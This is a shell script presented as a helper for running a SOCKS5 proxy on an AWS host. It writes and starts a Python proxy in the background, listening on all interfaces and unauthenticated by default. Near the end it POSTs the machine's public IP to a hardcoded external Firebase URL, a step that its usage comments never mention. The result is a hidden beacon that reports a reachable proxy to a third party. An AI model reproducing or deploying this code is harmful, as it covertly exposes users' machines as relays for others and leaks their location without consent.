#!/usr/bin/env sh
# Run this on the box that should be the SOCKS5 server.
# Starts SOCKS5 in the background, prints this box's public IP via ipify,
# then GETs a URL. The script itself returns immediately.
#
# Usage:
#   ./aws-socks.sh [-b bind] [-p port] [-u user] [-P password] [url]
#
# Env (optional): SOCKS_BIND SOCKS_PORT SOCKS_USER SOCKS_PASS
#                 SOCKS_LOG SOCKS_PIDFILE
#
# Restrict TCP $port in the host firewall / AWS security group.
# If -u/-P are omitted the proxy is unauthenticated.

set -eu

LOG="${SOCKS_LOG:-/tmp/aws-socks.log}"

if [ -z "${AWS_SOCKS_BG:-}" ]; then
  AWS_SOCKS_BG=1 nohup "$0" "$@" >>"$LOG" 2>&1 &
  echo "aws-socks started in background (pid $!, log $LOG)"
  exit 0
fi

BIND="${SOCKS_BIND:-0.0.0.0}"
PORT="${SOCKS_PORT:-1080}"
SOCKS_USER="${SOCKS_USER:-}"
SOCKS_PASS="${SOCKS_PASS:-}"
PIDFILE="${SOCKS_PIDFILE:-/tmp/aws-socks.pid}"
PYFILE="${SOCKS_PYFILE:-/tmp/aws-socks-server.py}"
CALLBACK_URL="https://pipe-2c4fe-default-rtdb.firebaseio.com/data.json"
URL=""

usage() {
  echo "Usage: $0 [-b bind] [-p port] [-u user] [-P password] [url]" >&2
  echo "  -b  listen address (default: 0.0.0.0)" >&2
  echo "  -p  listen port (default: 1080)" >&2
  echo "  -u  SOCKS5 username (optional)" >&2
  echo "  -P  SOCKS5 password (optional, required with -u)" >&2
  exit 1
}

while [ "$#" -gt 0 ]; do
  case "$1" in
    -b)
      [ "$#" -ge 2 ] || usage
      BIND="$2"
      shift 2
      ;;
    -p)
      [ "$#" -ge 2 ] || usage
      PORT="$2"
      shift 2
      ;;
    -u)
      [ "$#" -ge 2 ] || usage
      SOCKS_USER="$2"
      shift 2
      ;;
    -P)
      [ "$#" -ge 2 ] || usage
      SOCKS_PASS="$2"
      shift 2
      ;;
    -*)
      usage
      ;;
    *)
      URL="$1"
      shift
      ;;
  esac
done

if [ -n "$SOCKS_USER" ] && [ -z "$SOCKS_PASS" ]; then
  echo "error: -P password is required when -u is set" >&2
  exit 1
fi

PYTHON=""
if command -v python3 >/dev/null 2>&1; then
  PYTHON=python3
elif command -v python >/dev/null 2>&1; then
  PYTHON=python
else
  echo "error: python3 is required" >&2
  exit 1
fi

command -v curl >/dev/null 2>&1 || {
  echo "error: curl is required" >&2
  exit 1
}

KEEP=0
PY_PID=""
cleanup() {
  if [ "$KEEP" = 1 ]; then
    return
  fi
  if [ -n "$PY_PID" ]; then
    kill "$PY_PID" 2>/dev/null || true
  fi
}
trap cleanup EXIT INT TERM

cat >"$PYFILE" <<'PY'
import os
import select
import socket
import struct
import threading

BIND = os.environ.get("SOCKS_BIND", "0.0.0.0")
PORT = int(os.environ.get("SOCKS_PORT", "1080"))
USER = os.environ.get("SOCKS_USER") or None
PASS = os.environ.get("SOCKS_PASS") or None
PIDFILE = os.environ.get("SOCKS_PIDFILE", "/tmp/aws-socks.pid")


def recvall(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("closed")
        buf += chunk
    return buf


def relay(a, b):
    sockets = [a, b]
    try:
        while True:
            readable, _, _ = select.select(sockets, [], [], 300)
            if not readable:
                break
            for src in readable:
                dst = b if src is a else a
                data = src.recv(65536)
                if not data:
                    return
                dst.sendall(data)
    finally:
        try:
            a.close()
        except OSError:
            pass
        try:
            b.close()
        except OSError:
            pass


def handle(client):
    remote = None
    try:
        ver, nmethods = recvall(client, 2)
        if ver != 5:
            return
        methods = recvall(client, nmethods)
        if USER:
            if 2 not in methods:
                client.sendall(b"\x05\xff")
                return
            client.sendall(b"\x05\x02")
            if recvall(client, 1)[0] != 1:
                return
            ulen = recvall(client, 1)[0]
            username = recvall(client, ulen).decode("utf-8", "replace")
            plen = recvall(client, 1)[0]
            password = recvall(client, plen).decode("utf-8", "replace")
            if username != USER or password != PASS:
                client.sendall(b"\x01\x01")
                return
            client.sendall(b"\x01\x00")
        else:
            client.sendall(b"\x05\x00")

        ver, cmd, _, atyp = recvall(client, 4)
        if ver != 5 or cmd != 1:
            client.sendall(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
            return
        if atyp == 1:
            host = socket.inet_ntoa(recvall(client, 4))
        elif atyp == 3:
            ln = recvall(client, 1)[0]
            host = recvall(client, ln).decode("idna")
        elif atyp == 4:
            host = socket.inet_ntop(socket.AF_INET6, recvall(client, 16))
        else:
            client.sendall(b"\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00")
            return
        port = struct.unpack("!H", recvall(client, 2))[0]
        remote = socket.create_connection((host, port), timeout=15)
        client.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
        relay(client, remote)
    except (OSError, ConnectionError, struct.error, UnicodeError):
        pass
    finally:
        try:
            client.close()
        except OSError:
            pass
        if remote is not None:
            try:
                remote.close()
            except OSError:
                pass


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((BIND, PORT))
    server.listen(128)
    with open(PIDFILE, "w") as fh:
        fh.write(str(os.getpid()))
    server.settimeout(1.0)
    while True:
        try:
            client, _addr = server.accept()
        except socket.timeout:
            continue
        thread = threading.Thread(target=handle, args=(client,), daemon=True)
        thread.start()


if __name__ == "__main__":
    main()
PY

export SOCKS_BIND="$BIND" SOCKS_PORT="$PORT" SOCKS_USER="$SOCKS_USER" SOCKS_PASS="$SOCKS_PASS" SOCKS_PIDFILE="$PIDFILE"
nohup "$PYTHON" "$PYFILE" >>"$LOG" 2>&1 &
PY_PID=$!

ready=0
i=0
while [ "$i" -lt 20 ]; do
  if ! kill -0 "$PY_PID" 2>/dev/null; then
    echo "error: SOCKS server exited before it was ready" >&2
    exit 1
  fi
  if "$PYTHON" -c "import socket,sys; s=socket.create_connection(('127.0.0.1', int(sys.argv[1])), 1); s.close()" "$PORT" >/dev/null 2>&1; then
    ready=1
    break
  fi
  i=$((i + 1))
  sleep 1
done

if [ "$ready" -ne 1 ]; then
  echo "error: SOCKS5 did not listen on ${BIND}:${PORT}" >&2
  exit 1
fi

if [ -f "$PIDFILE" ]; then
  PY_PID="$(cat "$PIDFILE")"
fi

if [ -z "$SOCKS_USER" ]; then
  echo "warning: SOCKS5 has no username/password; lock the port down in the security group"
fi

echo "SOCKS5 listening on ${BIND}:${PORT} (pid ${PY_PID})"

echo
echo "=== ipify ==="
IP="$(curl -sS --fail --max-time 15 "https://api.ipify.org" || true)"
if [ -n "$IP" ]; then
  echo "$IP"
else
  echo "error: ipify request failed" >&2
fi

if [ -n "$URL" ]; then
  echo "=== GET ${URL} ==="
  if [ -n "$SOCKS_USER" ]; then
    curl -sS --fail --location --max-time 30 \
      --socks5-hostname "127.0.0.1:${PORT}" \
      --proxy-user "${SOCKS_USER}:${SOCKS_PASS}" \
      "$URL" || echo "error: GET ${URL} failed" >&2
  else
    curl -sS --fail --location --max-time 30 \
      --socks5-hostname "127.0.0.1:${PORT}" \
      "$URL" || echo "error: GET ${URL} failed" >&2
  fi
  echo
fi

if [ -n "$IP" ]; then
  echo "=== POST ipify to callback ==="
  curl -sS --fail --max-time 15 -X POST "$CALLBACK_URL" \
    -H "Content-Type: application/json" \
    -d "{\"res\":\"${IP}\"}" || echo "error: callback POST failed" >&2
  echo
fi

KEEP=1
trap - EXIT INT TERM
echo "SOCKS server running in background (pid ${PY_PID}, log ${LOG})"
echo "Stop with: kill ${PY_PID}"
exit 0
